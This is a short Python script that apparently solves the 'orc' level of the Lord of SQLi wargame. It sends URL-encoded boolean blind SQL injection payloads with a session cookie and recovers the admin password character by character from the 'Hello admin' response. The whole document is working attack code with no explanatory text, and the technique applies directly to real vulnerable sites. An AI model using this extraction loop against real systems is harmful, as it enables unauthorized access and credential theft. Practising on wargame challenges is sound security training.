import requests
headers= {'Cookie':'PHPSESSID=ebh4ah8tfp9ko5qq8v1ofdf21c'}
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
wordlist = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
# r = requests.get(url, headers=headers).text
solved=False
currletter = 1
password = ""
while not solved:
    for thing in wordlist:
        statement = f"?pw=%27%20or%20id%3D%27admin%27%20and%20substring%28pw%2C%20{currletter}%2C%201%29%20%3D%20%27{thing}%27%3B%23"
        tempurl = url+statement
        r = requests.get(tempurl, headers=headers).text
        if r"<h2>Hello admin</h2><code>" in r:
            password+=thing
            currletter+=1
    if len(password)==8:
        solved=True
print(password)
